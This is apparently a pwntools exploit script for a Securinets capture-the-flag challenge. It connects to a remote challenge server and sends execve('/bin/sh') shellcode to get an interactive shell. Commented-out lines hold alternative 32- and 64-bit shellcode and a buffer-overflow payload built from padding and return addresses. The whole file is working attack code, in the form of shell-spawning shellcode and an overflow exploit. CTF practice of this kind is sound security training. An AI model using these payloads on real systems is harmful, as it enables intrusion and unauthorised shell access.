from pwn import * 


#shellcode=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#shellcode=b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"+b"\x00"*8
#shellcode=b"\x48\x31\xf6\x56\x48\xbf\x48\x31\xf6\x56\x48\xbf\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
#p=remote("pwn.ctf.securinets.tn",5001)

shellcode=b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#p=process(["./shellc"])
p=remote("pwn.ctf.securinets.tn",5001)
#p.sendline(b"a"*0x108+p64(0x00000000004012c4)+p64(0x000000000040121b))

pause()
p.sendline(shellcode)


p.interactive()